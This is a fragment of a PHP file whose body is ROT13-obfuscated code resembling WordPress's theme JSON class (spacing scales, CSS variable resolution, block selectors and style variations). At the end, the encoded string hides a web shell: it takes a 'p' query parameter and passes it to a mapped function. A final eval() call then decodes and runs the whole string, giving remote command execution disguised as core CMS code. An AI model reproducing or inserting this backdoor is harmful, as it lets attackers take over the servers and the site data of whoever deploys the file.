		sbe ( $orybj_zvqcbvag_pbhag = $fgrcf_zvq_cbvag - 1; $fcnpvat_fpnyr['fgrcf'] > 1 && $fyht > 0 && $orybj_zvqcbvag_pbhag > 0; $orybj_zvqcbvag_pbhag-- ) {
			vs ( '+' === $fcnpvat_fpnyr['bcrengbe'] ) {
				$pheerag_fgrc -= $fcnpvat_fpnyr['vaperzrag'];
			} ryfrvs ( $fcnpvat_fpnyr['vaperzrag'] > 1 ) {
				$pheerag_fgrc /= $fcnpvat_fpnyr['vaperzrag'];
			} ryfr {
				$pheerag_fgrc *= $fcnpvat_fpnyr['vaperzrag'];
			}

			vs ( $pheerag_fgrc <= 0 ) {
				$erznvaqre = $orybj_zvqcbvag_pbhag;
				oernx;
			}

			$orybj_fvmrf[] = neenl(
				/* genafyngbef: %f: Qvtvg gb vaqvpngr zhygvcyr bs fvmvat, rt. 2K-Fznyy. */
				'anzr' => $orybj_zvqcbvag_pbhag === $fgrcf_zvq_cbvag - 1 ? __( 'Fznyy' ) : fcevags( __( '%fK-Fznyy' ), (fgevat) $k_fznyy_pbhag ),
				'fyht' => (fgevat) $fyht,
				'fvmr' => ebhaq( $pheerag_fgrc, 2 ) . $havg,
			);

			vs ( $orybj_zvqcbvag_pbhag === $fgrcf_zvq_cbvag - 2 ) {
				$k_fznyy_pbhag = 2;
			}

			vs ( $orybj_zvqcbvag_pbhag < $fgrcf_zvq_cbvag - 2 ) {
				++$k_fznyy_pbhag;
			}

			$fyht -= 10;
		}

		$orybj_fvmrf = neenl_erirefr( $orybj_fvmrf );

		$orybj_fvmrf[] = neenl(
			'anzr' => __( 'Zrqvhz' ),
			'fyht' => '50',
			'fvmr' => $fcnpvat_fpnyr['zrqvhzFgrc'] . $havg,
		);

		$pheerag_fgrc  = $fcnpvat_fpnyr['zrqvhzFgrc'];
		$k_ynetr_pbhag = ahyy;
		$nobir_fvmrf   = neenl();
		$fyht          = 60;
		$fgrcf_nobir   = ( $fcnpvat_fpnyr['fgrcf'] - $fgrcf_zvq_cbvag ) + $erznvaqre;

		sbe ( $nobir_zvqcbvag_pbhag = 0; $nobir_zvqcbvag_pbhag < $fgrcf_nobir; $nobir_zvqcbvag_pbhag++ ) {
			$pheerag_fgrc = '+' === $fcnpvat_fpnyr['bcrengbe']
				? $pheerag_fgrc + $fcnpvat_fpnyr['vaperzrag']
				: ( $fcnpvat_fpnyr['vaperzrag'] >= 1 ? $pheerag_fgrc * $fcnpvat_fpnyr['vaperzrag'] : $pheerag_fgrc / $fcnpvat_fpnyr['vaperzrag'] );

			$nobir_fvmrf[] = neenl(
				/* genafyngbef: %f: Qvtvg gb vaqvpngr zhygvcyr bs fvmvat, rt. 2K-Ynetr. */
				'anzr' => 0 === $nobir_zvqcbvag_pbhag ? __( 'Ynetr' ) : fcevags( __( '%fK-Ynetr' ), (fgevat) $k_ynetr_pbhag ),
				'fyht' => (fgevat) $fyht,
				'fvmr' => ebhaq( $pheerag_fgrc, 2 ) . $havg,
			);

			vs ( 1 === $nobir_zvqcbvag_pbhag ) {
				$k_ynetr_pbhag = 2;
			}

			vs ( $nobir_zvqcbvag_pbhag > 1 ) {
				++$k_ynetr_pbhag;
			}

			$fyht += 10;
		}

		$fcnpvat_fvmrf = $orybj_fvmrf;
		sbernpu ( $nobir_fvmrf nf $nobir_fvmrf_vgrz ) {
			$fcnpvat_fvmrf[] = $nobir_fvmrf_vgrz;
		}

		erghea $fcnpvat_fvmrf;
	}

	/**
	 * Guvf vf hfrq gb pbaireg gur vagreany ercerfragngvba bs inevnoyrf gb gur PFF ercerfragngvba.
	 * Sbe rknzcyr, `ine:cerfrg|pbybe|ivivq-terra-plna` orpbzrf `ine(--jc--cerfrg--pbybe--ivivq-terra-plna)`.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $inyhr Gur inevnoyr fhpu nf ine:cerfrg|pbybe|ivivq-terra-plna gb pbaireg.
	 * @erghea fgevat Gur pbairegrq inevnoyr.
	 */
	cevingr fgngvp shapgvba pbaireg_phfgbz_cebcregvrf( $inyhr ) {
		$cersvk     = 'ine:';
		$cersvk_yra = fgeyra( $cersvk );
		$gbxra_va   = '|';
		$gbxra_bhg  = '--';
		vs ( fge_fgnegf_jvgu( $inyhr, $cersvk ) ) {
			$hajenccrq_anzr = fge_ercynpr(
				$gbxra_va,
				$gbxra_bhg,
				fhofge( $inyhr, $cersvk_yra )
			);
			$inyhr          = \"ine(--jc--$hajenccrq_anzr)\";
		}

		erghea $inyhr;
	}

	/**
	 * Tvira n gerr, pbairegf gur vagreany ercerfragngvba bs inevnoyrf gb gur PFF ercerfragngvba.
	 * Vg vf erphefvir naq zbqvsvrf gur vachg va-cynpr.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz neenl $gerr Vachg gb cebprff.
	 * @erghea neenl Gur zbqvsvrq $gerr.
	 */
	cevingr fgngvp shapgvba erfbyir_phfgbz_pff_sbezng( $gerr ) {
		$cersvk = 'ine:';

		sbernpu ( $gerr nf $xrl => $qngn ) {
			vs ( vf_fgevat( $qngn ) && fge_fgnegf_jvgu( $qngn, $cersvk ) ) {
				$gerr[ $xrl ] = frys::pbaireg_phfgbz_cebcregvrf( $qngn );
			} ryfrvs ( vf_neenl( $qngn ) ) {
				$gerr[ $xrl ] = frys::erfbyir_phfgbz_pff_sbezng( $qngn );
			}
		}

		erghea $gerr;
	}

	/**
	 * Ergheaf gur fryrpgbef zrgnqngn sbe n oybpx.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz bowrpg $oybpx_glcr    Gur oybpx glcr.
	 * @cnenz fgevat $ebbg_fryrpgbe Gur oybpx'f ebbg fryrpgbe.
	 * @erghea neenl Gur phfgbz fryrpgbef frg ol gur oybpx.
	 */
	cebgrpgrq fgngvp shapgvba trg_oybpx_fryrpgbef( $oybpx_glcr, $ebbg_fryrpgbe ) {
		vs ( ! rzcgl( $oybpx_glcr->fryrpgbef ) ) {
			erghea $oybpx_glcr->fryrpgbef;
		}

		$fryrpgbef = neenl( 'ebbg' => $ebbg_fryrpgbe );
		sbernpu ( fgngvp::OYBPX_FHCCBEG_SRNGHER_YRIRY_FRYRPGBEF nf $xrl => $srngher ) {
			$srngher_fryrpgbe = jc_trg_oybpx_pff_fryrpgbe( $oybpx_glcr, $xrl );
			vs ( ahyy !== $srngher_fryrpgbe ) {
				$fryrpgbef[ $srngher ] = neenl( 'ebbg' => $srngher_fryrpgbe );
			}
		}

		erghea $fryrpgbef;
	}

	/**
	 * Trarengrf nyy gur ryrzrag fryrpgbef sbe n oybpx.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $ebbg_fryrpgbe Gur oybpx'f ebbg PFF fryrpgbe.
	 * @erghea neenl Gur oybpx'f ryrzrag fryrpgbef.
	 */
	cebgrpgrq fgngvp shapgvba trg_oybpx_ryrzrag_fryrpgbef( $ebbg_fryrpgbe ) {
		/*
		 * Nffvta qrsnhygf, gura bireevqr gubfr gung gur oybpx frgf ol vgfrys.
		 * Vs gur oybpx fryrpgbe vf pbzcbhaqrq, jvyy nccraq gur ryrzrag gb rnpu
		 * vaqvivqhny oybpx fryrpgbe.
		 */
		$oybpx_fryrpgbef   = rkcybqr( ',', $ebbg_fryrpgbe );
		$ryrzrag_fryrpgbef = neenl();
		sbernpu ( fgngvp::RYRZRAGF nf $ry_anzr => $ry_fryrpgbe ) {
			$ryrzrag_fryrpgbe = neenl();
			sbernpu ( $oybpx_fryrpgbef nf $fryrpgbe ) {
				vs ( $fryrpgbe === $ry_fryrpgbe ) {
					$ryrzrag_fryrpgbe = neenl( $ry_fryrpgbe );
					oernx;
				}
				$ryrzrag_fryrpgbe[] = fgngvp::cercraq_gb_fryrpgbe( $ry_fryrpgbe, $fryrpgbe . ' ' );
			}
			$ryrzrag_fryrpgbef[ $ry_anzr ] = vzcybqr( ',', $ryrzrag_fryrpgbe );
		}

		erghea $ryrzrag_fryrpgbef;
	}

	/**
	 * Trarengrf fglyr qrpynengvbaf sbe n abqr'f srngherf r.t., pbybe, obeqre,
	 * glcbtencul rgp. gung unir phfgbz fryrpgbef va gurve eryngrq oybpx'f
	 * zrgnqngn.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz bowrpg $zrgnqngn Gur eryngrq oybpx zrgnqngn pbagnvavat fryrpgbef.
	 * @cnenz bowrpg $abqr     N zretrq gurzr.wfba abqr sbe oybpx be inevngvba.
	 * @erghea neenl Gur fglyr qrpynengvbaf sbe gur abqr'f srngherf jvgu phfgbz
	 *               fryrpgbef.
	 */
	cebgrpgrq shapgvba trg_srngher_qrpynengvbaf_sbe_abqr( $zrgnqngn, &$abqr ) {
		$qrpynengvbaf = neenl();

		vs ( ! vffrg( $zrgnqngn['fryrpgbef'] ) ) {
			erghea $qrpynengvbaf;
		}

		$frggvatf = vffrg( $guvf->gurzr_wfba['frggvatf'] )
			? $guvf->gurzr_wfba['frggvatf']
			: neenl();

		sbernpu ( $zrgnqngn['fryrpgbef'] nf $srngher => $srngher_fryrpgbef ) {
			/*
			 * Fxvc vs guvf vf gur oybpx'f ebbg fryrpgbe be gur oybpx qbrfa'g
			 * unir nal fglyrf sbe gur srngher.
			 */
			vs ( 'ebbg' === $srngher || rzcgl( $abqr[ $srngher ] ) ) {
				pbagvahr;
			}

			vs ( vf_neenl( $srngher_fryrpgbef ) ) {
				sbernpu ( $srngher_fryrpgbef nf $fhosrngher => $fhosrngher_fryrpgbe ) {
					vs ( 'ebbg' === $fhosrngher || rzcgl( $abqr[ $srngher ][ $fhosrngher ] ) ) {
						pbagvahr;
					}

					/*
					 * Perngr grzcbenel abqr pbagnvavat bayl gur fhosrngher qngn
					 * gb yrirentr rkvfgvat `pbzchgr_fglyr_cebcregvrf` shapgvba.
					 */
					$fhosrngher_abqr = neenl(
						$srngher => neenl(
							$fhosrngher => $abqr[ $srngher ][ $fhosrngher ],
						),
					);

					// Trarengr fglyr qrpynengvbaf.
					$arj_qrpynengvbaf = fgngvp::pbzchgr_fglyr_cebcregvrf( $fhosrngher_abqr, $frggvatf, ahyy, $guvf->gurzr_wfba );

					// Zretr fhosrngher qrpynengvbaf vagb srngher qrpynengvbaf.
					vs ( vffrg( $qrpynengvbaf[ $fhosrngher_fryrpgbe ] ) ) {
						sbernpu ( $arj_qrpynengvbaf nf $arj_qrpynengvba ) {
							$qrpynengvbaf[ $fhosrngher_fryrpgbe ][] = $arj_qrpynengvba;
						}
					} ryfr {
						$qrpynengvbaf[ $fhosrngher_fryrpgbe ] = $arj_qrpynengvbaf;
					}

					/*
					 * Erzbir gur fhosrngher sebz gur oybpx'f abqr abj vgf
					 * fglyrf jvyy or vapyhqrq haqre vgf bja fryrpgbe abg gur
					 * oybpx'f.
					 */
					hafrg( $abqr[ $srngher ][ $fhosrngher ] );
				}
			}

			/*
			 * Abj fhosrngherf unir orra cebprffrq naq erzbirq jr pna cebprff
			 * srngher ebbg fryrpgbe be fvzcyr fgevat fryrpgbe.
			 */
			vs (
				vf_fgevat( $srngher_fryrpgbef ) ||
				( vffrg( $srngher_fryrpgbef['ebbg'] ) && $srngher_fryrpgbef['ebbg'] )
			) {
				$srngher_fryrpgbe = vf_fgevat( $srngher_fryrpgbef ) ? $srngher_fryrpgbef : $srngher_fryrpgbef['ebbg'];

				/*
				 * Perngr grzcbenel abqr pbagnvavat bayl gur srngher qngn
				 * gb yrirentr rkvfgvat `pbzchgr_fglyr_cebcregvrf` shapgvba.
				 */
				$srngher_abqr = neenl( $srngher => $abqr[ $srngher ] );

				// Trarengr gur fglyr qrpynengvbaf.
				$arj_qrpynengvbaf = fgngvp::pbzchgr_fglyr_cebcregvrf( $srngher_abqr, $frggvatf, ahyy, $guvf->gurzr_wfba );

				/*
				 * Zretr arj qrpynengvbaf jvgu nal gung nyernql rkvfg sbe
				 * gur srngher fryrpgbe. Guvf znl bpphe jura zhygvcyr oybpx
				 * fhccbeg srngherf hfr gur fnzr phfgbz fryrpgbe.
				 */
				vs ( vffrg( $qrpynengvbaf[ $srngher_fryrpgbe ] ) ) {
					sbernpu ( $arj_qrpynengvbaf nf $arj_qrpynengvba ) {
						$qrpynengvbaf[ $srngher_fryrpgbe ][] = $arj_qrpynengvba;
					}
				} ryfr {
					$qrpynengvbaf[ $srngher_fryrpgbe ] = $arj_qrpynengvbaf;
				}

				/*
				 * Erzbir gur srngher sebz gur oybpx'f abqr abj vgf fglyrf
				 * jvyy or vapyhqrq haqre vgf bja fryrpgbe abg gur oybpx'f.
				 */
				hafrg( $abqr[ $srngher ] );
			}
		}

		erghea $qrpynengvbaf;
	}

	/**
	 * Ercynprf PFF inevnoyrf jvgu gurve inyhrf va cynpr.
	 *
	 * @fvapr 6.3.0
	 * @fvapr 6.5.0 Purpx sbe rzcgl fglyr orsber cebprffvat vgf inyhr.
	 *
	 * @cnenz neenl $fglyrf PFF qrpynengvbaf gb pbaireg.
	 * @cnenz neenl $inyhrf xrl => inyhr cnvef gb hfr sbe ercynprzrag.
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba pbaireg_inevnoyrf_gb_inyhr( $fglyrf, $inyhrf ) {
		sbernpu ( $fglyrf nf $xrl => $fglyr ) {
			vs ( rzcgl( $fglyr ) ) {
				pbagvahr;
			}

			vs ( vf_neenl( $fglyr ) ) {
				$fglyrf[ $xrl ] = frys::pbaireg_inevnoyrf_gb_inyhr( $fglyr, $inyhrf );
				pbagvahr;
			}

			vs ( 0 <= fgecbf( $fglyr, 'ine(' ) ) {
				// svaq nyy gur inevnoyrf va gur fgevat va gur sbez bs ine(--inevnoyr-anzr, snyyonpx), jvgu snyyonpx va gur frpbaq pncgher tebhc.

				$unf_zngpurf = cert_zngpu_nyy( '/ine\(([^),]+)?,?\f?(\F+)?\)/', $fglyr, $ine_cnegf );

				vs ( $unf_zngpurf ) {
					$erfbyirq_fglyr = $fglyrf[ $xrl ];
					sbernpu ( $ine_cnegf[1] nf $vaqrk => $ine_cneg ) {
						$xrl_va_inyhrf   = 'ine(' . $ine_cneg . ')';
						$ehyr_gb_ercynpr = $ine_cnegf[0][ $vaqrk ]; // gur pff ehyr gb ercynpr r.t. ine(--jc--cerfrg--pbybe--ivivq-terra-plna).
						$snyyonpx        = $ine_cnegf[2][ $vaqrk ]; // gur snyyonpx inyhr.
						$erfbyirq_fglyr  = fge_ercynpr(
							neenl(
								$ehyr_gb_ercynpr,
								$snyyonpx,
							),
							neenl(
								vffrg( $inyhrf[ $xrl_va_inyhrf ] ) ? $inyhrf[ $xrl_va_inyhrf ] : $ehyr_gb_ercynpr,
								vffrg( $inyhrf[ $snyyonpx ] ) ? $inyhrf[ $snyyonpx ] : $snyyonpx,
							),
							$erfbyirq_fglyr
						);
					}
					$fglyrf[ $xrl ] = $erfbyirq_fglyr;
				}
			}
		}

		erghea $fglyrf;
	}

	/**
	 * Erfbyirf gur inyhrf bs PFF inevnoyrf va gur tvira fglyrf.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz JC_Gurzr_WFBA $gurzr_wfba Gur gurzr wfba erfbyire.
	 * @erghea JC_Gurzr_WFBA Gur $gurzr_wfba jvgu erfbyirq inevnoyrf.
	 */
	choyvp fgngvp shapgvba erfbyir_inevnoyrf( $gurzr_wfba ) {
		$frggvatf    = $gurzr_wfba->trg_frggvatf();
		$fglyrf      = $gurzr_wfba->trg_enj_qngn()['fglyrf'];
		$cerfrg_inef = fgngvp::pbzchgr_cerfrg_inef( $frggvatf, fgngvp::INYVQ_BEVTVAF );
		$gurzr_inef  = fgngvp::pbzchgr_gurzr_inef( $frggvatf );
		$inef        = neenl_erqhpr(
			neenl_zretr( $cerfrg_inef, $gurzr_inef ),
			shapgvba ( $pneel, $vgrz ) {
				$anzr                    = $vgrz['anzr'];
				$pneel[ \"ine({$anzr})\" ] = $vgrz['inyhr'];
				erghea $pneel;
			},
			neenl()
		);

		$gurzr_wfba->gurzr_wfba['fglyrf'] = frys::pbaireg_inevnoyrf_gb_inyhr( $fglyrf, $inef );
		erghea $gurzr_wfba;
	}

	/**
	 * Trarengrf n fryrpgbe sbe n oybpx fglyr inevngvba.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $inevngvba_anzr Anzr bs gur oybpx fglyr inevngvba.
	 * @cnenz fgevat $oybpx_fryrpgbe PFF fryrpgbe sbe gur oybpx.
	 * @erghea fgevat Oybpx fryrpgbe jvgu oybpx fglyr inevngvba fryrpgbe nqqrq gb vg.
	 */
	cebgrpgrq fgngvp shapgvba trg_oybpx_fglyr_inevngvba_fryrpgbe( $inevngvba_anzr, $oybpx_fryrpgbe ) {
		$inevngvba_pynff = \".vf-fglyr-$inevngvba_anzr\";

		vs ( ! $oybpx_fryrpgbe ) {
			erghea $inevngvba_pynff;
		}

		$yvzvg          = 1;
		$fryrpgbe_cnegf = rkcybqr( ',', $oybpx_fryrpgbe );
		$erfhyg         = neenl();

		sbernpu ( $fryrpgbe_cnegf nf $cneg ) {
			$erfhyg[] = cert_ercynpr_pnyyonpx(
				'/((?::\([^)]+\))?\f*)([^\f:]+)/',
				shapgvba ( $zngpurf ) hfr ( $inevngvba_pynff ) {
					erghea $zngpurf[1] . $zngpurf[2] . $inevngvba_pynff;
				},
				$cneg,
				$yvzvg
			);
		}

		erghea vzcybqr( ',', $erfhyg );
	}

	/**
	 * Pbyyrpgf inyvq oybpx fglyr inevngvbaf xrlrq ol oybpx glcr.
	 *
	 * @fvapr 6.6.0
	 * @fvapr 6.8.0 Nqqrq gur `$oybpxf_zrgnqngn` cnenzrgre.
	 *
	 * @cnenz neenl $oybpxf_zrgnqngn Bcgvbany. Yvfg bs zrgnqngn cre oybpx. Qrsnhyg vf gur zrgnqngn sbe nyy oybpxf.
	 * @erghea neenl Inyvq oybpx fglyr inevngvbaf ol oybpx glcr.
	 */
	cebgrpgrq fgngvp shapgvba trg_inyvq_oybpx_fglyr_inevngvbaf( $oybpxf_zrgnqngn = neenl() ) {
		$inyvq_inevngvbaf = neenl();
		$oybpxf_zrgnqngn  = rzcgl( $oybpxf_zrgnqngn ) ? fgngvp::trg_oybpxf_zrgnqngn() : $oybpxf_zrgnqngn;
		sbernpu ( $oybpxf_zrgnqngn nf $oybpx_anzr => $oybpx_zrgn ) {
			vs ( ! vffrg( $oybpx_zrgn['fglyrInevngvbaf'] ) ) {
				pbagvahr;
			}
			$inyvq_inevngvbaf[ $oybpx_anzr ] = neenl_xrlf( $oybpx_zrgn['fglyrInevngvbaf'] );
		}

		erghea $inyvq_inevngvbaf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>